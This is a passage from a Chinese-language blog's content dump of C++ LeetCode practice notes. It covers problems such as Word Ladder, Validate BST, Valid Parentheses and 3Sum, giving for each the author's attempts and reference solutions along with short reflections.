list. You may assume beginWord and endWord are non-empty and are not the same.123456789Input:beginWord = &quot;hit&quot;,endWord = &quot;cog&quot;,wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;,&quot;cog&quot;]Output: 5Explanation: As one shortest transformation is &quot;hit&quot; -&gt; &quot;hot&quot; -&gt; &quot;dot&quot; -&gt; &quot;dog&quot; -&gt; &quot;cog&quot;,return its length 5. 12345678Input:beginWord = &quot;hit&quot;endWord = &quot;cog&quot;wordList = [&quot;hot&quot;,&quot;dot&quot;,&quot;dog&quot;,&quot;lot&quot;,&quot;log&quot;]Output: 0Explanation: The endWord &quot;cog&quot; is not in wordList, therefore no possible transformation. 123456class Solution &#123;public: int ladderLength(string beginWord, string endWord, vector&lt;string&gt;&amp; wordList) &#123; &#125;&#125;; 我的思路 并没能AC(做了一点修改就AC了，开心！！！) 首先写了两个轮子，compare函数用来比较两个长度相等的字符串的差异度，findList函数用来寻找一个vector中改变一个字母可以变动的单词 然后就用栈来保存之前搜索的路径，类似于BFS 难点在于如何判断到了第几层，这时候就使用了另外一个栈同步保存层数 局限点在于原数据结构无法很好的保存，由于要防止闭环出现，找到了一个单词就删除掉了，导致无法回退，最终只能做到可以找到一条路径，但无法找到最短路径12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class Solution &#123;public: int ladderLength(string beginWord, string endWord, vector&lt;string&gt;&amp; wordList) &#123; if (find(wordList.begin(),wordList.end(),endWord) == wordList.end()) return 0; vector&lt;string&gt;::iterator findbegin = find(wordList.begin(),wordList.end(),beginWord); if (findbegin != wordList.end()) wordList.erase(findbegin); stack&lt;string&gt; words; stack&lt;int&gt; nums; words.push(beginWord); int count = 1; int max = 0; nums.push(count); while (!words.empty()) &#123; vector&lt;string&gt; findWords = findList(wordList, words.top()); printf(\"%s %d\\n\",words.top().c_str(),nums.top()); if (find(findWords.begin(),findWords.end(),endWord) != findWords.end()) return nums.top()+1; count = nums.top()+1; words.pop(); nums.pop(); max = findWords.size(); for (int i =0; i&lt;max;++i)&#123; words.push(findWords[i]); vector&lt;string&gt;::iterator it = find(wordList.begin(),wordList.end(),findWords[i]); wordList.erase(it); nums.push(count); &#125; &#125; return 0; &#125; vector&lt;string&gt; findList(vector&lt;string&gt;&amp; wordList, string str) &#123; vector&lt;string&gt; findList; vector&lt;string&gt;::iterator iter = wordList.begin(); while (iter != wordList.end()) &#123; if (*iter != str &amp;&amp; compare(*iter,str) &lt;= 1) findList.push_back(*iter); iter++; &#125; return findList; &#125; int compare(string str1, string str2) &#123; int size = str1.size(); int diff = 0; for (int i = 0; i&lt;size; ++i) &#123; if (str1[i] != str2[i]) diff++; &#125; return diff; &#125;&#125;; 参考思路 参考答案确实坐实了我的猜想，果然是单源最短路径问题，但由于没有给出图，自己重新构建邻接表又过于麻烦，所以一般是采用栈实现BFS来解题 用队列最大的好处就是不用回退，最先出队列的肯定是最短的路径 我TM，把我的代码里面的stack换成queue,top换成front就通过了。。。看不透看不透 还是贴一下别人的代码吧 感觉在搜索方面做的还没我优雅，虽然可能我的代码由于传参耗时会更长。。。 值得学习的是queue的巧妙运用，把我的两个queue写成了一个1234567891011121314151617181920212223242526272829class Solution &#123;public: int ladderLength(string beginWord, string endWord, unordered_set&lt;string&gt;&amp; wordList) &#123; wordList.insert(endWord); queue&lt;pair&lt;string, int&gt;&gt; que; que.push(make_pair(beginWord, 1)); wordList.erase(wordList.find(beginWord)); while(!que.empty()) &#123; auto val = que.front(); que.pop(); if(val.first == endWord) return val.second; for(int i =0; i&lt; val.first.size(); i++) &#123; string str = val.first; for(int j = 0; j &lt; 26; j++) &#123; str[i] = 'a'+j; if(wordList.count(str) == 1) &#123; que.push(make_pair(str, val.second+1)); wordList.erase(str); &#125; &#125; &#125; &#125; return 0; &#125;&#125;; 看了LeetCode上的答案，不得不贴一下超级大佬的优化 数据结构上的优化：实际上是使用set来实现队列的功能，find更节省时间 算法上的优化：居然还能双向搜索然后随时swap，比较好奇为什么swap还能这么快123456789101112131415161718192021222324252627282930313233343536class Solution &#123;public: int ladderLength(string beginWord, string endWord, vector&lt;string&gt;&amp; wordList) &#123; int n = beginWord.size(), ret = 1; unordered_set&lt;string&gt; wordSet(wordList.begin(), wordList.end()), beginSet&#123;beginWord&#125;, endSet&#123;endWord&#125;, nextSet; if(wordSet.erase(endWord) == 0)&#123; return 0; &#125; while(!beginSet.empty() &amp;&amp; !endSet.empty())&#123; ++ret; if(beginSet.size() &gt; endSet.size())&#123; swap(beginSet, endSet); &#125; for(string word: beginSet)&#123; for(int i = 0; i &lt; n; ++i)&#123; for(char j = 'a'; j &lt;= 'z'; ++j)&#123; char ch = word[i]; word[i] = j; if(endSet.count(word) != 0)&#123; return ret; &#125; if(wordSet.count(word) != 0)&#123; wordSet.erase(word); nextSet.insert(word); &#125; word[i] = ch; &#125; &#125; &#125; beginSet = nextSet; nextSet.clear(); &#125; return 0; &#125;&#125;; 感想 果然掌握各种数据结构的搭配是第一生产力","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++刷Leetcode笔记之 125. Valid Palindrome","slug":"C++刷Leetcode笔记之 125. Valid Palindrome","date":"2018-08-25T13:07:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/08/25/C++刷Leetcode笔记之 125. Valid Palindrome/","link":"","permalink":"https://liuyi12138.github.io/2018/08/25/C++刷Leetcode笔记之 125. Valid Palindrome/","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 回文是比较简单而经典的一道题，但调了很久的bug，写起来有点像3sum的内部循环 Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 回文是比较简单而经典的一道题，但调了很久的bug，写起来有点像3sum的内部循环 Leetcode传送门 Valid Palindrome [Difficulty Easy]题目 Given a string, determine if it is a palindrome, considering only alphanumeric characters and ignoring cases. Note: For the purpose of this problem, we define empty string as valid palindrome. Example:12345Input: &quot;A man, a plan, a canal: Panama&quot;Output: trueInput: &quot;race a car&quot;Output: false 123456class Solution &#123;public: bool isPalindrome(string s) &#123; &#125;&#125;; 我的思路 就简单的双向循环，又一次beat 100%的简单题，要点就是判断一个字符是否为字母或数字，好像还可以用C++的某方法判读来着123456789101112131415161718192021class Solution &#123;public: bool isPalindrome(string s) &#123; if (s.empty()) return true; transform(s.begin(),s.end(),s.begin(),::tolower); int begin = 0; int end = s.size()-1; while(begin &lt; end) &#123; while (!((s[begin]&gt;='a' &amp;&amp; s[begin]&lt;='z') || (s[begin]&gt;='0' &amp;&amp; s[begin]&lt;='9')) &amp;&amp; begin&lt;end) begin++; while (!((s[end]&gt;='a' &amp;&amp; s[end]&lt;='z') || (s[end]&gt;='0' &amp;&amp; s[end]&lt;='9')) &amp;&amp; begin&lt;end) end--; // printf(\"%c %c\\n\",s[begin],s[end]); if (s[begin] != s[end]) return false; begin++; end--; &#125; return true; &#125;&#125;;","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++刷Leetcode笔记之 98. Validate Binary Search Tree","slug":"C++刷Leetcode笔记之 98. Validate Binary Search Tree","date":"2018-08-25T10:13:04.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/08/25/C++刷Leetcode笔记之 98. Validate Binary Search Tree/","link":"","permalink":"https://liuyi12138.github.io/2018/08/25/C++刷Leetcode笔记之 98. Validate Binary Search Tree/","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 经典的二叉搜索树判断的问题，做之前还是百度了一下，效果贼好 Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 经典的二叉搜索树判断的问题，做之前还是百度了一下，效果贼好 Leetcode传送门 Validate Binary Search Tree [Difficulty: Medium]题目 Given a binary tree, determine if it is a valid binary search tree (BST). Assume a BST is defined as follows: The left subtree of a node contains only nodes with keys less than the node’s key. The right subtree of a node contains only nodes with keys greater than the node’s key. Both the left and right subtrees must also be binary search trees.123456789101112131415Input: 2 / \\ 1 3Output: true 5 / \\ 1 4 / \\ 3 6Output: falseExplanation: The input is: [5,1,4,null,null,3,6]. The root node&apos;s value is 5 but its right child&apos;s value is 4. 123456789101112131415/** * Definition for a binary tree node. * struct TreeNode &#123; * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125; * &#125;; */class Solution &#123;public: bool isValidBST(TreeNode* root) &#123; &#125;&#125;; 我的思路 采用递归的方式，难点在于二叉搜索树要求左子树的所有节点小于根节点，右子树的所有节点大于根节点，所以单纯递归肯定不行，必须携带上层的参数。 这里就有一个巧妙的方案，每次通过上层节点的值限定这个节点可取的最大最小值，就不用取递归寻找子树的最大最小值了。123456789101112131415161718192021222324/** * Definition for a binary tree node. * struct TreeNode &#123; * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125; * &#125;; */class Solution &#123;public: bool isValidBST(TreeNode* root) &#123; if(root == NULL) return true; return check(root, INT_MIN, INT_MAX); &#125; bool check(TreeNode* root, int min, int max) &#123; if(root == NULL) return true; if(root-&gt;val == INT_MIN &amp;&amp; root-&gt;left != NULL) return false; if(root-&gt;val == INT_MAX &amp;&amp; root-&gt;right != NULL) return false; if(root-&gt;val &lt; min || root-&gt;val &gt; max) return false; return (check(root-&gt;left, min, root-&gt;val-1) &amp;&amp; check(root-&gt;right, root-&gt;val+1, max)); &#125;&#125;; 参考思路 利用栈对二叉树进行前序遍历 标答更像是把树看作一个线性表，然后逐个比对判断其是否合乎规则12345678910111213141516171819202122232425262728293031323334353637/** * Definition for a binary tree node. * struct TreeNode &#123; * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125; * &#125;; */class Solution &#123;public: bool isValidBST(TreeNode* root) &#123; if(root == NULL) return true; TreeNode* current = root; TreeNode* pre = NULL; stack&lt;TreeNode*&gt; order; while(current || !order.empty()) &#123; while(current) &#123; order.push(current); current = current-&gt;left; &#125; current = order.top(); order.pop(); if(pre &amp;&amp; pre-&gt;val &gt;= current-&gt;val) return false; pre = current; current = current-&gt;right; &#125; return true; &#125;&#125;; 如何判断一棵树为二叉搜索树五种方法判断BST","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++刷Leetcode笔记之 88. Merge Sorted Array","slug":"C++刷Leetcode笔记之 88. Merge Sorted Array","date":"2018-08-24T13:46:04.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2018/08/24/C++刷Leetcode笔记之 88. Merge Sorted Array/","link":"","permalink":"https://liuyi12138.github.io/2018/08/24/C++刷Leetcode笔记之 88. Merge Sorted Array/","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 和21.Merge Two Sorted Lists就很像，ac速度也很像 Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 和21.Merge Two Sorted Lists就很像，ac速度也很像 Leetcode传送门 Merge Sorted Array [Difficulty Easy]题目 Given two sorted integer arrays nums1 and nums2, merge nums2 into nums1 as one sorted array. Note: The number of elements initialized in nums1 and nums2 are m and n respectively. You may assume that nums1 has enough space (size that is greater or equal to m + n) to hold additional elements from nums2. 12345Input:nums1 = [1,2,3,0,0,0], m = 3nums2 = [2,5,6], n = 3Output: [1,2,2,3,5,6] 123456class Solution &#123;public: void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) &#123; &#125;&#125;; 我的思路 很平常的一个题，突发奇想就用栈来做了，效果还不错，感觉比标答好123456789101112131415161718192021222324252627282930313233343536373839class Solution &#123;public: void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) &#123; printf(\"%d\\n\\n\",nums1.size()); stack&lt;int&gt; stk1; stack&lt;int&gt; stk2; for (int i = m-1; i&gt;=0; --i) stk1.push(nums1[i]); for (int j = n-1; j&gt;=0; --j) stk2.push(nums2[j]); int count = 0; while (!stk1.empty() &amp;&amp; !stk2.empty()) &#123; // printf(\"1 %d\\n\",nums1[count]); if (stk1.top() &lt; stk2.top()) &#123; nums1[count] = stk1.top(); stk1.pop(); &#125; else &#123; nums1[count] = stk2.top(); stk2.pop(); &#125; count++; &#125; while (!stk1.empty()) &#123; // printf(\"2 %d\\n\",nums1[count]); nums1[count] = stk1.top(); stk1.pop(); count++; &#125; while (!stk2.empty()) &#123; // printf(\"3 %d\\n\",nums1[count]); nums1[count] = stk2.top(); stk2.pop(); count++; &#125; return; &#125;&#125;;","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++刷Leetcode笔记之 73. Set Matrix Zeroes","slug":"C++刷Leetcode笔记之 73. Set Matrix Zeroes","date":"2018-08-24T10:24:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/08/24/C++刷Leetcode笔记之 73. Set Matrix Zeroes/","link":"","permalink":"https://liuyi12138.github.io/2018/08/24/C++刷Leetcode笔记之 73. Set Matrix Zeroes/","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 把空间复杂度看成时间复杂度可把人折磨坏了 Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 把空间复杂度看成时间复杂度可把人折磨坏了 Leetcode传送门 Set Matrix Zeroes [Difficulty: Medium]题目 Given a m x n matrix, if an element is 0, set its entire row and column to 0. Do it in-place. Example:123456789101112Input: [ [1,1,1], [1,0,1], [1,1,1]]Output: [ [1,0,1], [0,0,0], [1,0,1]] 123456789101112Input: [ [0,1,2,0], [3,4,5,2], [1,3,1,5]]Output: [ [0,0,0,0], [0,4,5,0], [0,3,1,0]] Follow up: A straight forward solution using O(mn) space is probably a bad idea. A simple improvement uses O(m + n) space, but still not the best solution. Could you devise a constant space solution? 123456class Solution &#123;public: void setZeroes(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) &#123; &#125;&#125;; 我的思路 把空间复杂度看成时间复杂度，然后想了很久，结果还是两个for循环 用了multimap存储0的信息，value为1时key是行数，value为0时key是列数1234567891011121314151617181920212223242526272829class Solution &#123;public: void setZeroes(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) &#123; multimap&lt;int,int&gt; Zeros; int rowSize = matrix.size(); int colSize = matrix[0].size(); for (int i = 0; i&lt;rowSize; ++i) for (int j = 0 ;j&lt;colSize; ++j) if (matrix[i][j] == 0)&#123; Zeros.insert(pair&lt;int, int&gt;(i, 1)); Zeros.insert(pair&lt;int, int&gt;(j, 0)); &#125; multimap&lt;int,int&gt;::iterator iter = Zeros.begin(); for (; iter!=Zeros.end(); ++iter) &#123; if (iter-&gt;second == 1) &#123; for (int m =0; m&lt;colSize; ++m) &#123; matrix[iter-&gt;first][m] = 0; &#125; &#125; else &#123; for (int n =0; n&lt;rowSize; ++n) &#123; matrix[n][iter-&gt;first] = 0; &#125; &#125; &#125; return; &#125; &#125;; 参考思路 答案用的是两个list存的信息，而不是multimap，确实看不出来为什么比我快，口亨","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++刷Leetcode笔记之 70. Climbing Stairs","slug":"C++刷Leetcode笔记之 70. Climbing Stairs","date":"2018-08-24T07:30:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/08/24/C++刷Leetcode笔记之 70. Climbing Stairs/","link":"","permalink":"https://liuyi12138.github.io/2018/08/24/C++刷Leetcode笔记之 70. Climbing Stairs/","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 递归和动规的典型问题，也是迅速ac了 Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 递归和动规的典型问题，也是迅速ac了 Leetcode传送门 Climbing Stairs [Difficulty: Easy]题目 You are climbing a stair case. It takes n steps to reach to the top. Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top? Note: Given n will be a positive integer. Example:123456789101112Input: 2Output: 2Explanation: There are two ways to climb to the top.1. 1 step + 1 step2. 2 stepsInput: 3Output: 3Explanation: There are three ways to climb to the top.1. 1 step + 1 step + 1 step2. 1 step + 2 steps3. 2 steps + 1 step 123456class Solution &#123;public: int climbStairs(int n) &#123; &#125;&#125;; 我的思路 第一想法是递归，写出第一版代码如下 12345678class Solution &#123;public: int climbStairs(int n) &#123; if (n == 1) return 1; if (n == 2) return 2; return climbStairs(n-1) + climbStairs(n-2); &#125;&#125;; 显然这代码超时了，因为递归过程中很多步骤会被重复计算2次，所以最好是把中间值存起来，这时候动规的优势就体现出来了 12345678910111213class Solution &#123;public: int climbStairs(int n) &#123; if (n == 1) return 1; if (n == 2) return 2; int results[n+1]; results[1] = 1; results[2] = 2; for (int i=3; i&lt;=n; ++i) results[i] = results[i-1] + results[i-2]; return results[n] ; &#125;&#125;;","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++刷Leetcode笔记之 28. Implement strStr()","slug":"C++刷Leetcode笔记之 28. Implement strStr()","date":"2018-08-24T07:15:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/08/24/C++刷Leetcode笔记之 28. Implement strStr()/","link":"","permalink":"https://liuyi12138.github.io/2018/08/24/C++刷Leetcode笔记之 28. Implement strStr()/","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 更简单的出现了 Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 更简单的出现了 Leetcode传送门 Implement strStr() [Difficulty Easy]题目 Return the index of the first occurrence of needle in haystack, or -1 if needle is not part of haystack. Example:12345Input: haystack = &quot;hello&quot;, needle = &quot;ll&quot;Output: 2Input: haystack = &quot;aaaaa&quot;, needle = &quot;bba&quot;Output: -1 12345class Solution &#123;public: int strStr(string haystack, string needle) &#123; &#125;&#125;; 我的思路 本来想用KMP算法，但发现这方面的算法可不少，不如老老实实用轮子 各种字符串匹配算法1234567class Solution &#123;public: int strStr(string haystack, string needle) &#123; if (needle == \"\") return 0; return haystack.find(needle);; &#125;&#125;;","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++刷Leetcode笔记之 21. Merge Two Sorted Lists","slug":"C++刷Leetcode笔记之 21. Merge Two Sorted Lists ","date":"2018-08-23T14:42:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/08/23/C++刷Leetcode笔记之 21. Merge Two Sorted Lists /","link":"","permalink":"https://liuyi12138.github.io/2018/08/23/C++刷Leetcode笔记之 21. Merge Two Sorted Lists /","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 遇到过的最简单的一个题23333 Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 遇到过的最简单的一个题23333 Leetcode传送门 Merge Two Sorted Lists [Difficulty Easy]题目 Merge two sorted linked lists and return it as a new list. The new list should be made by splicing together the nodes of the first two lists. Example: 12Input: 1-&gt;2-&gt;4, 1-&gt;3-&gt;4Output: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4 1234567891011121314/** * Definition for singly-linked list. * struct ListNode &#123; * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public: ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) &#123; &#125;&#125;; 我的思路 这个思路就很清晰了，逐个比对添加就好了1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * Definition for singly-linked list. * struct ListNode &#123; * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public: ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) &#123; if (l1 == NULL) return l2; else if(l2 == NULL) return l1; ListNode *p = l1; ListNode *q = l2; ListNode *head; ListNode *l3; if (p-&gt;val &lt;= q-&gt;val) &#123; l3 = p; p = p-&gt;next; &#125; else &#123; l3 = q; q = q-&gt;next; &#125; head = l3; while (p != NULL &amp;&amp; q != NULL) &#123; if (p-&gt;val &gt; q-&gt;val) &#123; l3-&gt;next = q; l3 = q; q = q-&gt;next; &#125; else &#123; l3-&gt;next = p; l3 = p; p = p-&gt;next; &#125; &#125; l3-&gt;next = (p == NULL) ? q : p; return head; &#125;&#125;; 参考思路 可以优化的位置就是最开始的那次判断可以去掉，让l3 = ListNode(0),然后最后返回head-&gt;next就好了现场(这个next很精妙啊)","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++刷Leetcode笔记之 20.Valid Parentheses","slug":"C++刷Leetcode笔记之 20.Valid Parentheses","date":"2018-08-23T10:05:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/08/23/C++刷Leetcode笔记之 20.Valid Parentheses/","link":"","permalink":"https://liuyi12138.github.io/2018/08/23/C++刷Leetcode笔记之 20.Valid Parentheses/","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 Leetcode传送门 Valid Parentheses [Difficulty Easy]题目 Given a string containing just the characters ‘(‘, ‘)’, ‘{‘, ‘}’, ‘[‘ and ‘]’, determine if the input string is valid. An input string is valid if: Open brackets must be closed by the same type of brackets. Open brackets must be closed in the correct order. Note that an empty string is also considered valid. Example：12345Input: &quot;()[]&#123;&#125;&quot;Output: trueInput: &quot;([)]&quot;Output: false 123456class Solution &#123;public: bool isValid(string s) &#123; &#125;&#125;; 我的思路 每次在给定字符串中截取一段括号，当正括号和反括号数量相同时进行检测(使用自定义的check函数)，check函数检测给定段的字符串是否正确 check函数每次检测给定字符串最外层的括号是否匹配，然后去除匹配的括号，截取剩下的字符串传入isValid函数检测 两个函数递归造成时间较长1234567891011121314151617181920212223242526272829303132333435363738394041424344class Solution &#123;public: bool isValid(string s) &#123; int size = s.size(); if (size == 0) return true; if (size%2 == 1) return false; if ((s[size-1] != ')') &amp;&amp; (s[size-1] != ']') &amp;&amp; (s[size-1] != '&#125;')) return false; else &#123; int ref = 0,suf = 0; int begin = 0,flag=0; for (int i = 0; i&lt;size; ++i) &#123; if ((s[begin] != '(') &amp;&amp; (s[begin] != '[') &amp;&amp; (s[begin] != '&#123;')) return false; if ((s[i] == '(') || (s[i] == '[') || (s[i] == '&#123;')) ref++; else suf ++; if (ref == suf) &#123; if (!check(s,begin,i)) return false; else &#123; flag = 1; begin = i+1; &#125; &#125; &#125; if (!flag) return false; return true; &#125; &#125; bool check(string s,int begin,int end) &#123; if ((s[begin]=='('&amp;&amp;s[end]==')')||(s[begin]=='['&amp;&amp;s[end]==']')||(s[begin]=='&#123;'&amp;&amp;s[end]=='&#125;')) &#123; if (begin &lt; end -1) &#123; if (isValid(s.substr(begin+1,end-begin-1))) return true; return false; &#125; return true; &#125; return false; &#125;&#125;; 参考思路 此问题可参考逆波兰表达式 对于运算符匹配的问题都可以使用栈来解决123456789101112131415161718192021222324252627282930313233class Solution &#123;public: stack&lt;char&gt; stk; bool isValid(string s) &#123; for(int i=0; i&lt;s.size();i++) &#123; if( s[i]=='(' || s[i]=='[' || s[i]=='&#123;' ) &#123; stk.push(s[i]); &#125; if( s[i]==')' || s[i]==']' || s[i]=='&#125;' ) &#123; if (stk.empty()) return false; else &#123; if (s[i]==')' &amp;&amp; stk.top()=='(' ) stk.pop(); else if (s[i]==']' &amp;&amp; stk.top()=='[' ) stk.pop(); else if (s[i]=='&#125;' &amp;&amp; stk.top()=='&#123;' ) stk.pop(); else return false; &#125; &#125; &#125; return stk.empty(); &#125;&#125;; 感想 感觉对数据结构的掌握还是不够，一般不会想到用栈，队列，堆等数据结构来解决问题","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++刷Leetcode笔记之 15.3Sum","slug":"C++刷Leetcode笔记之 15.3Sum ","date":"2018-08-23T02:50:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/08/23/C++刷Leetcode笔记之 15.3Sum /","link":"","permalink":"https://liuyi12138.github.io/2018/08/23/C++刷Leetcode笔记之 15.3Sum /","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 Two Sum 的爸爸题，3sum之前一直没做出来，当然这次也没做出来 Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 Two Sum 的爸爸题，3sum之前一直没做出来，当然这次也没做出来 Leetcode传送门 3Sum [Difficulty: Medium]题目 Given an array nums of n integers, are there elements a, b, c in nums such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero. Note: The solution set must not contain duplicate triplets. Example: 1234567Given array nums = [-1, 0, 1, 2, -1, -4],A solution set is:[ [-1, 0, 1], [-1, -1, 2]] 123456class Solution &#123;public: vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) &#123; &#125;&#125;; 我的思路 最直接的想法是3sum = for(Two sum)+去重 这样子，就写出了下面一波代码 当然最难的部分还是去重，用算法去重是不可能的，这辈子都不可能用算法去重的，只能调调接口这样子才能勉强维持生活，也是因为如此超时了。。。死在倒数第三个测试用例12345678910111213141516171819202122232425262728class Solution &#123;public: vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) &#123; vector&lt;vector&lt;int&gt;&gt; result; for(vector&lt;int&gt;::iterator iter = nums.begin(); iter != nums.end(); iter++) &#123; int target = 0 - *iter; vector&lt;int&gt;::iterator iternext = iter; iternext ++ ; for(vector&lt;int&gt;::iterator it = iternext; it != nums.end(); it++) &#123; vector&lt;int&gt;::iterator itnext = it; itnext ++ ; vector&lt;int&gt;::iterator exit = std::find(itnext,nums.end(), target - *it); if (exit != nums.end()) &#123; vector&lt;int&gt; temp; temp.push_back(*iter); temp.push_back(*it); temp.push_back(target - *it); sort(temp.begin(),temp.end()); result.push_back(temp); &#125; &#125; &#125; sort(result.begin(),result.end()); result.erase(unique(result.begin(), result.end()), result.end()); return result; &#125;&#125;; 参考思路 3Sum有别于 Two sum即在于其要求和为0而不是一个任意值，所以可以考虑正负数的问题 我们用两个指针分别指向外层循环选择的数字之后开始的数组首尾两个数，如果两个数和正好为target，则将这三个数一起存入结果中 采用类似于快排的方法防止重复及寻找两个数：两个指针都需要检测重复数字。如果两数之和小于target，则我们将左边那个指针i右移一位，使得指向的数字增大一些。同理，如果两数之和大于target，则我们将右边那个指针j左移一位，使得指向的数字减小一些1234567891011121314151617181920212223class Solution &#123;public: vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) &#123; vector&lt;vector&lt;int&gt;&gt; res; sort(nums.begin(), nums.end()); for (int k = 0; k &lt; nums.size(); ++k) &#123; if (nums[k] &gt; 0) break; if (k &gt; 0 &amp;&amp; nums[k] == nums[k - 1]) continue; int target = 0 - nums[k]; int i = k + 1, j = nums.size() - 1; while (i &lt; j) &#123; if (nums[i] + nums[j] == target) &#123; res.push_back(&#123;nums[k], nums[i], nums[j]&#125;); while (i &lt; j &amp;&amp; nums[i] == nums[i + 1]) 